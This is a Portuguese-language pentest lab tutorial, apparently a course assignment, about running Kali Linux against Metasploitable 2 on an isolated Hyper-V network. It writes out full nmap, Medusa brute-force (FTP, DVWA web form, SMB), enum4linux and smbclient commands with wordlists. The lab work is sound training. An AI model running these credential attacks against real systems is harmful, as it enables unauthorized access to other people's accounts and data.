# Atividade Prática de Pentest: Do Zero no Hyper-V aos Ataques de Brute Force

Como tarefa solicitada pela DIO no curso Cibersegurança do Zero à Prática, tive que montar esse laboratório prático e resolvi criar este tutorial bem direto e sem enrolação.

Aqui você vai aprender a rodar o Kali Linux e o Metasploitable 2 no Hyper-V do Windows (sim, na raça como TI faz, convertendo o disco que veio pra VirtualBox/VMware) e executar os testes práticos de varredura, força bruta e enumeração de serviços reais como FTP, Web e SMB.

🛠️ O que vamos precisar

🐧 Kali Linux: kali.org/get-kali/#kali-platforms (vai na aba de Virtual Machines e pega a sua).

🎯 Metasploitable 2: Baixa no SourceForge (ele vem num arquivo .vmdk).

🔄 StarWind V2V Converter: Aplicativo gratuito pra converter o disco pro Hyper-V.

💻 PASSO 1: Subindo o Lab no Hyper-V

1. Convertendo o disco do Metasploitable 2

Como o Hyper-V não abre .vmdk nativamente, a gente precisa transformar ele em .vhdx:

Baixe e extraia o arquivo do Metasploitable 2.

Abra o StarWind V2V Image Converter.

Escolha o arquivo .vmdk e converta para formato VHDX.

2. Criando a Rede Privada (Isolada)

Pra não vazar nada pra sua rede de casa nem pra internet:

Abra o Gerenciador do Hyper-V.

Clique em Gerenciador de Comutadores Virtuais... no menu da direita.

Escolha Particular (Private) e clique em Criar Comutador Virtual.

Dá o nome de Lab-Privado e salva.

3. Criando a VM do Metasploitable 2

No Hyper-V, vai em Novo > Máquina Virtual.

Nome: Metasploitable2.

Geração: Escolha Geração 1 (muito importante! Ele não roda em Geração 2 por causa da BIOS/UEFI antiga).

RAM: 512 MB ou 1024 MB tá ótimo.

Conexão de Rede: Escolha o Lab-Privado.

Disco Rígido: Marque "Usar um disco rígido virtual existente" e selecione o .vhdx que você converteu.

4. Configurando a máquina do Kali Linux

Nas configurações da sua VM do Kali, vai na Placa de Rede.

Muda a conexão pro mesmo switch Lab-Privado.

⚙️ PASSO 2: Ajustando os IPs na Raça

Como a rede Particular do Hyper-V não tem servidor DHCP distribuindo IP automático, a gente precisa definir os IPs na mão na mesma sub-rede (ex: 192.168.100.x).

🔴 No Metasploitable 2:

Liga a máquina e faz login:

Usuário: msfadmin

Senha: msfadmin

Edite o arquivo de rede:

sudo nano /etc/network/interfaces


Deixa a interface eth0 assim:

auto eth0
iface eth0 inet static
address 192.168.100.10
netmask 255.255.255.0


Salva com Ctrl + O, Enter e sai com Ctrl + X.

Reinicia a rede:

sudo /etc/init.d/networking restart


🐉 No Kali Linux:

Abre o terminal e joga um IP na mesma faixa:

sudo ip addr add 192.168.100.20/24 dev eth0


🔍 PASSO 3: Reconhecimento e Varredura (Nmap)

Vamos acessar o terminal do Kali para ver se as duas VMs estão conversando e mapear as portas abertas:

# Testar o ping
ping -c 4 192.168.100.10

# Escanear portas específicas e pegar versões dos serviços
nmap -sV -p 21,22,80,445,139 192.168.100.10


💡 Nota: Se você tentar logar no FTP agora (ftp 192.168.100.10), ele vai pedir login e senha. Vamos usar o brute force para descobrir!

💣 PASSO 4: Criando as Wordlists e Atacando o FTP

Vamos criar duas listas no terminal e usar a ferramenta Medusa pra testar os acessos.

Criando lista de usuários (users.txt):

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt


Criando lista de senhas (pass.txt):

echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt


Rodando o Medusa no FTP:

medusa -h 192.168.100.10 -U users.txt -P pass.txt -M ftp -t 6


Assim que o Medusa terminar, ele vai te mostrar o usuário e a senha que foram localizadas com [SUCCESS]! E então é só usar pra entrar no FTP.

🌐 PASSO 5: Brute Force em Formulário Web (DVWA)

Formulários de login em sites são os alvos mais comuns do dia a dia. Precisei instalar o DVWA no Kali para realizar este teste:

1. Instalando e subindo o DVWA no Kali

sudo apt update
sudo apt install dvwa

# Iniciar a aplicação
dvwa-start


(Se pedir senha no terminal, digita a padrão do Kali: kali).

2. Inspecionando a requisição no navegador

Acesse o endereço no navegador: http://192.168.100.10/dvwa/login.php

Aperta F12, vai na aba Network (Rede).

Informa um login e senha qualquer pra ver o erro Login failed.

Depois clica na requisição POST que apareceu e olha na aba Request. Você vai ver os campos username, password que você preencheu e o botão Login.

3. Brute Force Web com o Medusa

Vamos usar as listas geradas para testar o formulário web:

medusa -h 192.168.100.10 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6


Quando o Medusa encontrar a combinação certa, ele avisa com [SUCCESS]. Em um sistema real, isso te daria acesso direto ao painel do admin e ao banco de dados!

🕵️‍♂️ PASSO 6: Enumeração de SMB e Password Spraying

Agora vamos fazer um ataque em cadeia: primeiro extrair dados do sistema e depois fazer um password spraying.

1. Mapeando o SMB com enum4linux

enum4linux -a 192.168.100.10 | tee enum4_output.txt

# Pra ler o relatório depois de pronto:
less enum4_output.txt


Dá pra ver dados do Workgroup e nomes de usuários reais do sistema alvo.

2. Criando listas focadas em SMB

# Usuários achados no sistema
echo -e "user\nmsfadmin\nservice" > smb_users.txt

# Senhas comuns pra teste
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt


3. Testando as credenciais no Medusa (SMB)

medusa -h 192.168.100.10 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50


Se aparecer Account Found, achamos! Credencial validada.

📁 PASSO 7: Entrando no Sistema com o Smbclient

Agora é só testar o acesso com a credencial encontrada (ex: msfadmin):

smbclient -L //192.168.100.10 -U msfadmin


Digita a senha quando pedir.

Se logar, você vai ver a lista de pastas e arquivos compartilhados.

Dá pra navegar, baixar arquivos, subir payloads e explorar o sistema todo por ali!

🧠 IMPORTANTE

Você reparou que em nenhum momento foi preciso rodar um código malicioso ou explorar um bug de software?

Tudo o que foi usado aqui foram informações públicas e expostas (enumeração de portas e serviços) combinadas com senhas fracas e padrão que muita gente ainda usa por aí.

📌 Dica: Segurança básica é tudo! Nunca use senhas fracas ou padrão como 123456 em seus ambientes!
